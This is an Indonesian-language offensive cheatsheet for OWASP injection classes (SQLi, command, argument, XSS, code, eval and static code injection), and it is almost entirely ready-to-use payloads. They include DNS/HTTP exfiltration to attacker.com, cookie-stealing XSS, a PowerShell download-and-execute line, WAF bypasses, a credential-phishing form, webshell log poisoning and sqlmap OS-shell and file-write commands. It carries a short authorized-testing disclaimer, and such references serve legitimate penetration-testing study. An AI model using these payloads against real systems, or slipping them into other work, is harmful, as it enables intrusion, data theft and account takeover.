# 💉 INJECTION CHEATSHEET — Part 5C-1

## OWASP A03:2021 Injection — CWE Mapped Full Reference

> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi & tujuan pendidikan.**

---

## 📑 Table of Contents (5C-1)
1. [CWE-89: SQL Injection](#cwe-89-sql-injection)
2. [CWE-78: OS Command Injection](#cwe-78-os-command-injection)
3. [CWE-77: Command Injection](#cwe-77-command-injection)
4. [CWE-88: Argument Injection](#cwe-88-argument-injection)
5. [CWE-79: Cross-Site Scripting (XSS)](#cwe-79-cross-site-scripting-xss)
6. [CWE-80: Basic XSS](#cwe-80-basic-xss)
7. [CWE-83: Script in Attributes XSS](#cwe-83-script-in-attributes-xss)
8. [CWE-94: Code Injection](#cwe-94-code-injection)
9. [CWE-95: Eval Injection](#cwe-95-eval-injection)
10. [CWE-96: Static Code Injection](#cwe-96-static-code-injection)

---

# CWE-89: SQL Injection

**Deskripsi**: Penyerang memasukkan SQL statements ke input fields yang tidak di-sanitize, memungkinkan manipulasi database.

## Detection

```bash
# ===== AUTOMATED =====
# SQLMap (dari URL)
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# SQLMap (dari Burp request)
sqlmap -r request.txt --batch --level=5 --risk=3

# Nuclei
nuclei -u https://target.com -t http/vulnerabilities/sqli/

# gf pattern
cat urls.txt | gf sqli > sqli_targets.txt
```

## Payloads — Error-Based

```sql
-- MySQL
' OR 1=1--
' OR '1'='1'--
" OR 1=1--
' UNION SELECT NULL--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=1::int--

-- MSSQL
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=1; EXEC xp_cmdshell('whoami')--

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
```

## Payloads — Union-Based

```sql
-- Step 1: Find column count
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY 3--  (sampai error)

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- MySQL specific
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users--
```

## Payloads — Blind (Boolean-Based)

```sql
-- TRUE condition
' AND 1=1--
' AND 'a'='a'--

-- FALSE condition
' AND 1=2--

-- Extract data karakter per karakter
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='b'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

## Payloads — Blind (Time-Based)

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)--
' AND BENCHMARK(10000000, SHA1('test'))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

## Payloads — Out-of-Band (OOB)

```sql
-- MySQL (DNS exfil)
' AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\a'))--
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--

-- MSSQL (DNS exfil)
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @x VARCHAR(1024); SET @x=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@x+'.attacker.com\a"')--

-- Oracle (HTTP)
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))=1--

-- PostgreSQL (copy)
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/'--
```

## WAF Bypass Techniques

```sql
-- Case variation
uNiOn SeLeCt
UnIoN/**/sElEcT

-- Comment injection
UN/**/ION SE/**/LECT
/*!50000UNION*/ /*!50000SELECT*/

-- URL encoding
%55%4e%49%4f%4e %53%45%4c%45%43%54
%2527 (double URL encode ')

-- Whitespace alternatives
UNION%0aSELECT
UNION%0dSELECT
UNION%09SELECT
UNION%0bSELECT

-- No spaces
'/**/UNION/**/SELECT/**/
'UNION(SELECT(1),(2),(3))

-- Inline comments (MySQL)
'/*!UNION*/+/*!SELECT*/+1,2,3--

-- String concatenation
CONCAT('sel','ect')
'sel'||'ect'

-- Hex encoding
0x73656C656374  (= 'select')

-- SQLMap tamper scripts
sqlmap -r req.txt --tamper=space2comment,between,randomcase
sqlmap -r req.txt --tamper=charencode,apostrophemask,equaltolike
sqlmap -r req.txt --tamper=base64encode,space2plus
```

## SQLMap Advanced

```bash
# Full enumeration
sqlmap -r req.txt --batch --level=5 --risk=3 --dbs --dump-all --threads=10

# Specific DBMS
sqlmap -r req.txt --dbms=mysql
sqlmap -r req.txt --dbms=postgresql
sqlmap -r req.txt --dbms=mssql

# Technique
sqlmap -r req.txt --technique=BEUST

# OS shell
sqlmap -r req.txt --os-shell

# SQL shell  
sqlmap -r req.txt --sql-shell

# File read/write
sqlmap -r req.txt --file-read="/etc/passwd"
sqlmap -r req.txt --file-write=shell.php --file-dest=/var/www/html/shell.php

# Second-order
sqlmap -r req.txt --second-url="https://target.com/profile"

# Proxy through Burp
sqlmap -r req.txt --proxy="http://127.0.0.1:8080"
```

---

# CWE-78: OS Command Injection

**Deskripsi**: Penyerang inject OS commands ke aplikasi yang mengeksekusi system commands tanpa validasi.

## Detection

```bash
# Commix
commix -u "https://target.com/page?ip=127.0.0.1" --batch

# Nuclei
nuclei -u https://target.com -tags rce,command-injection

# Manual: inject di parameter yang kemungkinan call OS command
# (ping, traceroute, nslookup, whois, file operations)
```

## Payloads

```bash
# ===== COMMAND SEPARATORS =====
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0a whoami        # newline
%0d whoami        # carriage return
\n whoami

# ===== BASIC =====
127.0.0.1; whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 && id
127.0.0.1 || ls -la
127.0.0.1 `sleep 5`
127.0.0.1 $(sleep 5)

# ===== BLIND (Time-Based) =====
; sleep 5
| sleep 5
& sleep 5 &
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
| ping -c 5 127.0.0.1

# ===== BLIND (OOB / DNS) =====
; nslookup attacker.com
| curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(cat /etc/hostname)
$(curl http://attacker.com/?d=$(whoami))
`nslookup $(whoami).attacker.com`

# ===== WINDOWS =====
& dir
| dir
; dir
127.0.0.1 & whoami
127.0.0.1 | type C:\Windows\win.ini
& ping -n 5 127.0.0.1
| powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# ===== BYPASS FILTERS =====
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat<>/etc/passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# Base64 bypass
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Variable bypass
a=c;b=at;c=/etc/passwd;$a$b $c

# Wildcard bypass
/???/??t /???/??ss??
```

## Tools

```bash
# Commix (full)
commix -u "https://target.com/page?cmd=test" --os-shell
commix -u "https://target.com/page" --data="ip=127.0.0.1" -p ip --batch
commix -u "https://target.com/page?cmd=test" --technique=t  # time-based
commix -u "https://target.com/page?cmd=test" --technique=f  # file-based
```

---

# CWE-77: Command Injection

**Deskripsi**: Mirip CWE-78 tapi lebih general — injection ke any command yang dieksekusi oleh aplikasi (bukan hanya OS commands).

## Payloads

```bash
# Application-level command injection
# Biasa di: Git operations, file converters, PDF generators, image processors

# ImageMagick (CVE-2016-3714 "ImageTragick")
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami")'
pop graphic-context

# FFmpeg SSRF
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST

# Git
--upload-pack='touch /tmp/pwned'
ext::sh -c curl% http://attacker.com/$(whoami)

# Ghostscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops

# wkhtmltopdf / headless Chrome (SSRF → RCE)
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<script>document.location='http://attacker.com/'+document.cookie</script>
```

---

# CWE-88: Argument Injection

**Deskripsi**: Penyerang inject arguments/flags ke command-line programs yang dijalankan oleh aplikasi.

## Payloads

```bash
# Tar argument injection
--checkpoint=1 --checkpoint-action=exec=id

# Curl argument injection
-o /var/www/html/shell.php http://attacker.com/shell.php

# Wget argument injection
--post-file=/etc/passwd http://attacker.com/exfil

# Find argument injection
-exec id ;
-exec /bin/sh -c 'id' ;

# SSH argument injection
-o ProxyCommand="curl attacker.com/$(whoami)"

# Git argument injection
--upload-pack="id"
-c core.sshCommand="curl attacker.com"

# PHP mail() (5th parameter)
-X/var/www/html/shell.php
-OQueueDirectory=/tmp -X/var/www/html/shell.php

# Rsync argument injection
-e "sh -c 'id > /tmp/pwned'"
--rsh="curl attacker.com/$(id)"

# Zip/Unzip
file.zip -T --unzip-command="id"
```

---

# CWE-79: Cross-Site Scripting (XSS)

**Deskripsi**: Penyerang inject malicious scripts ke web pages yang dilihat oleh users lain.

## Detection

```bash
# Dalfox
dalfox url "https://target.com/search?q=test"
cat urls.txt | dalfox pipe --blind "https://callback.xss.ht"

# XSStrike
python xsstrike.py -u "https://target.com/search?q=test"

# Nuclei
nuclei -u https://target.com -tags xss

# gf pattern
cat urls.txt | gf xss > xss_targets.txt
```

## Reflected XSS Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- IMG tag -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img/src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert(1)">

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>

<!-- Anchor -->
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- Iframe -->
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
```

## Stored XSS Payloads

```html
<!-- Profile / comment fields -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">

<!-- Persistent via SVG upload -->
<!-- File: evil.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

<!-- Markdown injection -->
[Click](javascript:alert(1))
![img](x "onerror=alert(1)")
```

## DOM XSS

```javascript
// Sources (user-controlled input)
document.URL
document.referrer
document.location
window.location.hash
window.location.search
window.name
document.cookie
localStorage / sessionStorage
postMessage data

// Sinks (dangerous functions)
eval()
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML
element.setAttribute("onclick", ...)
window.location = ...
jQuery.html()
jQuery.append()
jQuery.$()

// Payloads
#<img src=x onerror=alert(1)>
?default=<script>alert(1)</script>
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
```

## Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Without parentheses -->
<script>alert`1`</script>
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>

<!-- Without alert keyword -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>self['al'+'ert'](1)</script>
<script>top[/al/.source+/ert/.source](1)</script>

<!-- HTML encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Without < > -->
" onfocus=alert(1) autofocus="
' onfocus='alert(1)' autofocus='

<!-- SVG/Math namespace -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><animatetransform onbegin=alert(1)>

<!-- Mutation XSS (mXSS) -->
<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

# CWE-80: Basic XSS (HTML Tag Injection)

**Deskripsi**: Variasi XSS paling dasar — inject HTML tags yang mengandung script.

```html
<!-- Basic HTML injection test -->
<b>test</b>
<i>test</i>
<h1>test</h1>

<!-- Escalate ke XSS -->
<b onmouseover=alert(1)>hover me</b>
<a href="javascript:alert(1)">click</a>

<!-- Form injection (phishing) -->
<form action="https://attacker.com/steal">
  <h2>Session Expired - Please Login</h2>
  <input name="user" placeholder="Username">
  <input name="pass" type="password" placeholder="Password">
  <input type="submit" value="Login">
</form>
```

---

# CWE-83: Script in Attributes XSS

**Deskripsi**: XSS via event handler attributes di HTML elements.

```html
<!-- Attribute context breakout -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onfocus="alert(1)" autofocus="

<!-- Common vulnerable attributes -->
<input value="USER_INPUT" onfocus=alert(1) autofocus>
<a href="#" onclick="alert(1)">click</a>
<div style="background:url('javascript:alert(1)')">

<!-- Style attribute -->
<div style="width:expression(alert(1))">    <!-- IE only -->
<div style="background:url('data:text/html,<script>alert(1)</script>')">

<!-- Data attributes to JS -->
<div data-payload="&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;">
```

---

# CWE-94: Code Injection

**Deskripsi**: Penyerang inject code yang dieksekusi oleh aplikasi (PHP, Python, Ruby, Node.js, etc).

## PHP Code Injection

```php
// Vulnerable: eval(), assert(), preg_replace with /e, include(), require()

// Payloads
${phpinfo()}
${system('whoami')}
${exec('id')}
';phpinfo();//
';system('cat /etc/passwd');//
${${eval(base64_decode('c3lzdGVtKCdpZCcpOw=='))}}

// preg_replace /e modifier
/e modifier: .*)/e → system('id')

// assert()
'.phpinfo().'
'.system('whoami').'
```

## Python Code Injection

```python
# Vulnerable: eval(), exec(), os.system(), subprocess, pickle.loads()

# Payloads
__import__('os').system('whoami')
eval("__import__('os').popen('id').read()")
exec("import os; os.system('id')")

# SSTI → Code Injection
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Pickle deserialization RCE
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dumps(Exploit())
```

## Node.js Code Injection

```javascript
// Vulnerable: eval(), Function(), vm.runInNewContext(), child_process

// Payloads
require('child_process').execSync('whoami').toString()
global.process.mainModule.require('child_process').execSync('id').toString()

// eval context
eval("require('child_process').execSync('id')")

// vm escape
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
```

## Ruby Code Injection

```ruby
# Vulnerable: eval(), system(), exec(), `backticks`

# Payloads
`whoami`
system('id')
exec('cat /etc/passwd')
eval("system('whoami')")
%x(id)
IO.popen('id').read
open('|id').read
```

---

# CWE-95: Eval Injection

**Deskripsi**: Specific case of Code Injection melalui fungsi eval() atau equivalent.

```javascript
// JavaScript
eval('alert(1)')
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
setTimeout('alert(1)', 0)
setInterval('alert(1)', 1000)
new Function('alert(1)')()

// Bypass eval filters
[].constructor.constructor('alert(1)')()
window['ev'+'al']('alert(1)')
this['\x65\x76\x61\x6c']('alert(1)')
```

```python
# Python
eval("__import__('os').system('id')")
exec("print('pwned')")
compile("import os; os.system('id')", "<string>", "exec")
```

```php
// PHP
eval('system("whoami");')
assert('phpinfo()')
create_function('', 'system("id");')
```

---

# CWE-96: Static Code Injection

**Deskripsi**: Penyerang inject code ke file yang di-save dan kemudian di-execute oleh server.

```php
// PHP — inject ke config/log files
// Jika app menulis user input ke .php file:

// Log poisoning
User-Agent: <?php system($_GET['cmd']); ?>
// Lalu access: /var/log/apache2/access.log?cmd=whoami

// Config file injection
'; system('id'); //
"; phpinfo(); //

// .htaccess injection
AddType application/x-httpd-php .txt
# Membuat semua .txt dieksekusi sebagai PHP

// PHP session injection
// Inject ke session file, lalu include via LFI
<?php system('id'); ?>
// LFI: /index.php?page=../../../tmp/sess_SESSION_ID
```

---

> **Detection Tools Summary**:
> | CWE | Tool |
> |-----|------|
> | CWE-89 (SQLi) | SQLMap, sqlninja, jSQL, Havij |
> | CWE-78/77 (CMDi) | Commix |
> | CWE-79 (XSS) | Dalfox, XSStrike, XSSer |
> | CWE-94 (Code Inj) | Manual + Nuclei templates |
> | All | Burp Suite, ZAP, Nuclei |
